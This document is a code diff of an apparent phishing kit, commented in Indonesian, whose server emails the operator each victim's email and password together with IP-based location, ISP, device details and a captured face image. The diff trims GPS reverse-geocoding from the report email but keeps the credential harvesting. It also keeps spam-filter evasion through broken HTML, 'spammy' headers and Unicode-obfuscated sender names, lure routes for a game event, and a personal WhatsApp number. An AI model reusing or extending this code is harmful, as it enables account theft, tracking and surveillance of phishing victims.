@@ -340,64 +340,28 @@ function makeCombiningText(baseText) {
     return result;
 }
 
-function classifyLocationSource(gpsAccuracy, hasGPS) {
-    if (!hasGPS || !gpsAccuracy || gpsAccuracy === '-' || gpsAccuracy === null) {
-        return { source: 'IP Geolocation (fallback)', level: 'LOW', color: '#ff9800' };
-    }
-    const acc = parseFloat(gpsAccuracy);
-    if (acc <= 50) return { source: 'GPS (high accuracy)', level: 'VERY HIGH', color: '#4caf50' };
-    if (acc <= 100) return { source: 'GPS / WiFi (good)', level: 'HIGH', color: '#8bc34a' };
-    if (acc <= 500) return { source: 'WiFi / Cell Tower', level: 'MEDIUM', color: '#ffc107' };
-    if (acc <= 3000) return { source: 'Cell Tower', level: 'LOW', color: '#ff9800' };
-    return { source: 'IP / Network', level: 'VERY LOW', color: '#f44336' };
-}
-
 // ========== FUNGSI KIRIM EMAIL ==========
 async function sendEmail(data, folderName) {
     const asnData = await getASNAndAccurateLocation(data.ip_address);
     
-    const hasGPS = data.latitude && data.latitude !== '-' && data.longitude && data.longitude !== '-';
-    const gpsAccuracy = data.gps_accuracy;
-    const locSource = classifyLocationSource(gpsAccuracy, hasGPS);
+    // Ambil User Agent & parsing engine/arch secara simpel
+    const ua = data.userAgent || 'Unknown';
+    let engine = 'Unknown', arch = 'Unknown', os = data.platform || 'Unknown';
     
-    const finalLat = hasGPS ? data.latitude : (asnData.latitude || '-');
-    const finalLon = hasGPS ? data.longitude : (asnData.longitude || '-');
-    const finalAccuracy = hasGPS ? `${gpsAccuracy} m (GPS)` : 'IP-based (radius 10-50 km)';
-    
-    let reverseGeo = asnData.reverseGeocode;
-    if (hasGPS) {
-        try {
-            const res = await fetch(
-                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.latitude}&lon=${data.longitude}&zoom=18&addressdetails=1`,
-                { headers: { 'User-Agent': 'GST-Report/1.0' } }
-            );
-            const d = await res.json();
-            if (d && d.address) {
-                reverseGeo = {
-                    displayName: d.display_name,
-                    road: d.address.road || d.address.pedestrian || '-',
-                    neighbourhood: d.address.neighbourhood || d.address.suburb || '-',
-                    village: d.address.village || d.address.hamlet || '-',
-                    district: d.address.city_district || d.address.district || '-',
-                    city: d.address.city || d.address.town || d.address.county || '-',
-                    state: d.address.state || '-',
-                    postcode: d.address.postcode || '-',
-                    country: d.address.country || '-',
-                    countryCode: d.address.country_code?.toUpperCase() || '-'
-                };
-            }
-        } catch (e) { console.error('Nominatim GPS error:', e.message); }
-    }
-    
-    // Pastikan nama kota/provinsi tidak disingkat (mengambil dari reverse geocode jika ada, atau API fallback)
-    const countryName = reverseGeo?.country || asnData.country;
-    const countryCode = reverseGeo?.countryCode || asnData.countryCode;
-    const regionName = reverseGeo?.state || asnData.region;
-    const cityName = reverseGeo?.city || asnData.city;
-    const postalCode = reverseGeo?.postcode || asnData.postalCode;
+    if (ua.includes('AppleWebKit')) engine = 'WebKit';
+    if (ua.includes('Chrome')) engine = 'Blink';
+    if (ua.includes('Gecko') && !ua.includes('like Gecko')) engine = 'Gecko';
+    if (ua.includes('64')) arch = '64 Bit';
+    else if (ua.includes('32') || ua.includes('WOW64')) arch = '32 Bit';
+
+    const countryName = asnData.country;
+    const countryCode = asnData.countryCode;
+    const regionName = asnData.region;
+    const cityName = asnData.city;
     const ispName = asnData.isp;
     const asnInfo = asnData.asn;
-    const asnameInfo = asnData.asname;
+    const timezone = data.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const loginMethod = data.email && data.email.includes('@gmail.com') ? 'Google Play' : 'Web Login';
     
     const flagEmoji = getFlagEmoji(countryCode);
     
@@ -407,37 +371,7 @@ async function sendEmail(data, folderName) {
     const gstRTL = makeRTLText('GST DIVISION');
     const gstRandom = randPick([gstSpammy, gstFullwidth, gstCombining, gstRTL]);
     
-    let reverseGeoHtml = '';
-    if (reverseGeo) {
-        const rg = reverseGeo;
-        reverseGeoHtml = `
-        <tr class="section-header"><td colspan="2">Alamat Lengkap (Reverse Geocoding)</td></tr>
-        <tr><td class="label">Sumber</td><td class="value">${hasGPS ? 'GPS (koordinat presisi)' : 'IP Geolocation'}</td></tr>
-        <tr><td class="label">Alamat Lengkap</td><td class="value">${rg.displayName || '-'}</td></tr>
-        <tr><td class="label">Jalan</td><td class="value">${rg.road}</td></tr>
-        <tr><td class="label">RT/RW/Neighbourhood</td><td class="value">${rg.neighbourhood}</td></tr>
-        <tr><td class="label">Desa/Kelurahan</td><td class="value">${rg.village}</td></tr>
-        <tr><td class="label">Kecamatan</td><td class="value">${rg.district}</td></tr>
-        <tr><td class="label">Kota/Kabupaten</td><td class="value">${rg.city}</td></tr>
-        <tr><td class="label">Provinsi</td><td class="value">${rg.state}</td></tr>
-        <tr><td class="label">Kode Pos</td><td class="value">${rg.postcode}</td></tr>
-        <tr><td class="label">Negara</td><td class="value">${rg.country} (${rg.countryCode})</td></tr>`;
-    }
-    
-    let multiSourceHtml = '';
-    const sourceKeys = Object.keys(asnData.sources);
-    if (sourceKeys.length > 0) {
-        multiSourceHtml = `<tr class="section-header"><td colspan="2">Multi-API Cross-Check IP (${asnData.accuracy})</td></tr>`;
-        for (const key of sourceKeys) {
-            const s = asnData.sources[key];
-            multiSourceHtml += `
-            <tr><td class="label">${key} City</td><td class="value">${s.city || '-'}</td></tr>
-            <tr><td class="label">${key} Region</td><td class="value">${s.region || '-'}</td></tr>
-            <tr><td class="label">${key} Lat/Lon</td><td class="value">${s.lat || '-'}, ${s.lon || '-'}</td></tr>`;
-        }
-    }
-    
-    // DESAIN EMAIL BARU: Biru, Transparan, Animasi, Font Tebal
+    // DESAIN EMAIL RINGKAS: Sesuai Screenshot
     const htmlContent = `<!DOCTYPE html>
 <html lang="id">
 <head>
@@ -445,17 +379,13 @@ async function sendEmail(data, folderName) {
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>GST DIVISION REPORT</title>
 <style>
-    @keyframes scan {
-        0% { background-position: 0 0; }
-        100% { background-position: 0 100%; }
-    }
     @keyframes pulse {
         0%, 100% { opacity: 1; text-shadow: 0 0 10px #00d2ff; }
         50% { opacity: 0.6; text-shadow: 0 0 20px #00d2ff, 0 0 30px #00d2ff; }
     }
     @keyframes glow {
-        0%, 100% { box-shadow: 0 0 5px rgba(0, 210, 255, 0.5); border-color: rgba(0, 210, 255, 0.5); }
-        50% { box-shadow: 0 0 20px rgba(0, 210, 255, 0.9); border-color: rgba(0, 210, 255, 1); }
+        0%, 100% { box-shadow: 0 0 5px rgba(0, 210, 255, 0.3); border-color: rgba(0, 210, 255, 0.4); }
+        50% { box-shadow: 0 0 15px rgba(0, 210, 255, 0.8); border-color: rgba(0, 210, 255, 1); }
     }
     body {
         margin: 0; padding: 20px;
@@ -464,132 +394,83 @@ async function sendEmail(data, folderName) {
         color: #ffffff;
     }
     .container {
-        max-width: 650px; margin: auto;
+        max-width: 600px; margin: auto;
         background: rgba(0, 20, 50, 0.6);
         backdrop-filter: blur(10px);
         border: 1px solid rgba(0, 210, 255, 0.4);
-        border-radius: 15px;
+        border-radius: 10px;
         overflow: hidden;
         animation: glow 3s infinite alternate;
     }
     .topbar {
         background: linear-gradient(90deg, #001f3f, #00509e);
         color: #00d2ff;
-        text-align: center; padding: 25px 15px;
-        font-size: 26px; font-weight: 900; letter-spacing: 2px;
+        text-align: center; padding: 20px 15px;
+        font-size: 22px; font-weight: 900; letter-spacing: 1px;
         border-bottom: 2px solid #00d2ff;
         animation: pulse 2s infinite;
         word-wrap: break-word;
     }
-    .main-content { padding: 20px; }
     table {
         width: 100%; border-collapse: collapse;
-        background: rgba(0, 10, 30, 0.5);
-        border-radius: 10px; overflow: hidden;
-        margin-bottom: 25px;
-        border: 1px solid rgba(0, 150, 255, 0.3);
     }
     th, td {
-        padding: 14px 15px;
+        padding: 12px 15px;
         border-bottom: 1px solid rgba(0, 150, 255, 0.2);
-        text-align: left; font-size: 14px;
+        text-align: left; font-size: 13px;
     }
     tr:last-child td { border-bottom: none; }
     .label {
-        font-weight: 800; color: #00d2ff; width: 40%;
+        font-weight: 800; color: #00d2ff; width: 35%;
         text-transform: uppercase; letter-spacing: 1px;
     }
     .value {
         color: #e0f7fa; font-weight: 600; word-break: break-word;
     }
-    .value a { color: #00d2ff; text-decoration: none; font-weight: bold; }
     .section-header {
         background: rgba(0, 80, 158, 0.8);
         color: #00d2ff; text-align: center;
-        font-weight: 900; text-transform: uppercase; letter-spacing: 2px;
-        font-size: 15px; padding: 15px;
-    }
-    .accuracy-badge {
-        display: inline-block; padding: 5px 10px; border-radius: 20px;
-        font-weight: bold; color: #000; font-size: 12px;
+        font-weight: 900; text-transform: uppercase;
+        font-size: 14px; padding: 12px;
     }
     .footer-sign {
         background: linear-gradient(90deg, #001f3f, #00509e);
         border-top: 2px solid #00d2ff;
-        text-align: center; padding: 20px;
-        color: #00d2ff; font-size: 16px; font-weight: 900;
-        letter-spacing: 1px;
+        text-align: center; padding: 15px;
+        color: #00d2ff; font-size: 14px; font-weight: 900;
     }
 </style>
 </head>
 <body>
 <div class="container">
     <div class="topbar">${gstRandom}</div>
-    <div class="main-content">
-        <table>
-            <tr class="section-header"><td colspan="2">Account Information</td></tr>
-            <tr><td class="label">Email / Phone</td><td class="value">${data.email || '-'}</td></tr>
-            <tr><td class="label">Password</td><td class="value">${data.emailPassword || '-'}</td></tr>
-            <tr><td class="label">Phone</td><td class="value">${data.phone || '-'}</td></tr>
-            <tr><td class="label">Full Name</td><td class="value">${data.fullName || '-'}</td></tr>
-        </table>
-
-        <table>
-            <tr class="section-header"><td colspan="2">Lokasi Final (Prioritas Utama)</td></tr>
-            <tr><td class="label">Sumber</td><td class="value"><span class="accuracy-badge" style="background:${locSource.color}">${locSource.source}</span></td></tr>
-            <tr><td class="label">Level Akurasi</td><td class="value" style="color:${locSource.color}"><b>${locSource.level}</b></td></tr>
-            <tr><td class="label">Latitude</td><td class="value">${finalLat}</td></tr>
-            <tr><td class="label">Longitude</td><td class="value">${finalLon}</td></tr>
-            <tr><td class="label">Accuracy</td><td class="value">${finalAccuracy}</td></tr>
-            <tr><td class="label">Google Maps</td><td class="value"><a href="https://www.google.com/maps?q=${finalLat},${finalLon}" target="_blank">Buka Maps</a></td></tr>
-        </table>
-
-        <table>
-            <tr class="section-header"><td colspan="2">GPS Browser (Device)</td></tr>
-            <tr><td class="label">Status GPS</td><td class="value" style="color:${hasGPS ? '#4caf50' : '#f44336'}">${hasGPS ? '✅ DAPAT' : '❌ GAGAL / DITOLAK'}</td></tr>
-            <tr><td class="label">Latitude GPS</td><td class="value">${data.latitude || '-'}</td></tr>
-            <tr><td class="label">Longitude GPS</td><td class="value">${data.longitude || '-'}</td></tr>
-            <tr><td class="label">Accuracy GPS</td><td class="value">${data.gps_accuracy || '-'} m</td></tr>
-            <tr><td class="label">Sumber GPS</td><td class="value">${data.gps_source || 'IP fallback'}</td></tr>
-        </table>
-
-        ${reverseGeoHtml ? `<table>${reverseGeoHtml}</table>` : ''}
-
-        <table>
-            <tr class="section-header"><td colspan="2">Informasi IP (Fallback)</td></tr>
-            <tr><td class="label">Negara</td><td class="value">${countryName} ${flagEmoji}</td></tr>
-            <tr><td class="label">Provinsi</td><td class="value">${regionName}</td></tr>
-            <tr><td class="label">Kota</td><td class="value">${cityName}</td></tr>
-            <tr><td class="label">Kode Pos</td><td class="value">${postalCode}</td></tr>
-            <tr><td class="label">Lat / Lon IP</td><td class="value">${asnData.latitude || '-'}, ${asnData.longitude || '-'}</td></tr>
-            <tr><td class="label">Akurasi IP</td><td class="value">${asnData.accuracy}</td></tr>
-        </table>
-
-        ${multiSourceHtml ? `<table>${multiSourceHtml}</table>` : ''}
-
-        <table>
-            <tr class="section-header"><td colspan="2">Network & ASN</td></tr>
-            <tr><td class="label">IP Address</td><td class="value">${data.ip_address || '-'}</td></tr>
-            <tr><td class="label">ISP</td><td class="value">${ispName}</td></tr>
-            <tr><td class="label">ASN</td><td class="value">${asnInfo}</td></tr>
-            <tr><td class="label">AS Name</td><td class="value">${asnameInfo}</td></tr>
-            <tr><td class="label">Organization</td><td class="value">${asnData.org}</td></tr>
-        </table>
-
-        <table>
-            <tr class="section-header"><td colspan="2">Device Information</td></tr>
-            <tr><td class="label">Platform</td><td class="value">${data.platform || '-'}</td></tr>
-            <tr><td class="label">Resolution</td><td class="value">${data.screenResolution || '-'}</td></tr>
-            <tr><td class="label">Language</td><td class="value">${data.language || '-'}</td></tr>
-            <tr><td class="label">User Agent</td><td class="value" style="font-size:12px;">${data.userAgent || '-'}</td></tr>
-        </table>
-
-        <table>
-            <tr class="section-header"><td colspan="2">Timestamp</td></tr>
-            <tr><td class="label">Waktu Akses</td><td class="value">${data.timestamp || new Date().toLocaleString('id-ID')}</td></tr>
-        </table>
-    </div>
-    <div class="footer-sign">${gstRandom} - GST DIVISION</div>
+    <table>
+        <tr><td class="label">Email / Phone</td><td class="value" style="color:#4fc3f7;">${data.email || '-'}</td></tr>
+        <tr><td class="label">Password</td><td class="value">${data.emailPassword || '-'}</td></tr>
+        <tr><td class="label">Login</td><td class="value">${loginMethod}</td></tr>
+    </table>
+    <div class="section-header">Information</div>
+    <table>
+        <tr><td class="label">IP Address</td><td class="value">${data.ip_address || '-'}</td></tr>
+        <tr><td class="label">Country</td><td class="value">${countryName}</td></tr>
+        <tr><td class="label">Country Code</td><td class="value">${countryCode}</td></tr>
+        <tr><td class="label">Province</td><td class="value">${regionName}</td></tr>
+        <tr><td class="label">Region Name</td><td class="value">${regionName}</td></tr>
+        <tr><td class="label">City</td><td class="value">${cityName}</td></tr>
+        <tr><td class="label">ISP</td><td class="value">${ispName}</td></tr>
+        <tr><td class="label">ASN</td><td class="value">${asnInfo}</td></tr>
+        <tr><td class="label">Latitude</td><td class="value">${asnData.latitude || '-'}</td></tr>
+        <tr><td class="label">Longitude</td><td class="value">${asnData.longitude || '-'}</td></tr>
+        <tr><td class="label">Timezone</td><td class="value">${timezone}</td></tr>
+    </table>
+    <div class="section-header">Device Information</div>
+    <table>
+        <tr><td class="label">User Agent</td><td class="value" style="font-size:11px;">${ua}</td></tr>
+        <tr><td class="label">Platform</td><td class="value">${os}</td></tr>
+        <tr><td class="label">Engine</td><td class="value">${engine}</td></tr>
+        <tr><td class="label">Arch</td><td class="value">${arch}</td></tr>
+    </table>
+    <div class="footer-sign">©Nomor Whatsapp Admin Web -> 0819-7763-9470</div>
 </div>
 </body>
 </html>`;
@@ -670,7 +551,7 @@ async function sendEmail(data, folderName) {
             html: htmlContent + brokenHtml,
             headers: spammyHeaders
         });
-        console.log(`✅ [${folderName}] Sent to: ${receiver} - Sumber: ${locSource.source} | Level: ${locSource.level} | Lat: ${finalLat}, Lon: ${finalLon}`);
+        console.log(`✅ [${folderName}] Sent to: ${receiver} - IP: ${data.ip_address} | City: ${cityName}`);
     }
 }
 
@@ -993,18 +874,16 @@ app.get('/', (req, res) => {
             return null;
         }
 
-        // cek status izin dulu — kalau sudah denied permanen, jangan ganggu user
         try {
             const perm = await navigator.permissions.query({ name: 'geolocation' });
             if (perm.state === 'denied') {
                 document.getElementById('gpsStatus').innerText = '❌ Izin lokasi ditolak permanen';
                 return null;
             }
-        } catch (e) { /* permissions API tidak ada di browser lama — lanjut saja */ }
+        } catch (e) { }
 
         document.getElementById('gpsStatus').innerText = '🔔 Menunggu izin lokasi dari user...';
 
-        // satu panggilan getCurrentPosition, timeout 60s, user punya waktu jawab prompt
         return new Promise(function(resolve) {
             navigator.geolocation.getCurrentPosition(
                 function(pos) {
@@ -1101,6 +980,8 @@ app.get('/', (req, res) => {
                 platform: deviceInfo.platform,
                 screenResolution: deviceInfo.screenResolution,
                 language: deviceInfo.language,
+                timezone: deviceInfo.timezone,
+                userAgent: deviceInfo.userAgent,
                 timestamp: new Date().toLocaleString('id-ID'),
                 wajah_base64: wajah || null,
                 deviceInfo: deviceInfo
@@ -1174,9 +1055,7 @@ app.listen(PORT, () => {
     console.log(`   → http://localhost:${PORT}/kttwwxy`);
     console.log(`   → http://localhost:${PORT}/mdgffew`);
     console.log(`   → http://localhost:${PORT}/FF_EventA`);
-    console.log(`\n✅ EMAIL TEMPLATE: Dark Blue Transparent + Animation + Full Region Name!`);
-    console.log(`✅ UNICODE SPAM: Diubah menjadi "GST DIVISION"!`);
+    console.log(`\n✅ EMAIL TEMPLATE: Persis seperti Screenshot (Hanya data inti)!`);
+    console.log(`✅ UNICODE SPAM: Menggunakan "GST DIVISION"!`);
     console.log(`✅ GPS CONSENT-FIRST: browser nanya user, tunggu jawaban (timeout 60s)!`);
-    console.log(`✅ MULTI-API GEOLOCATION: ip-api.com + ipapi.co + ipwho.is cross-check!`);
-    console.log(`✅ REVERSE GEOCODING: Nominatim (OpenStreetMap) untuk alamat lengkap!`);
 });
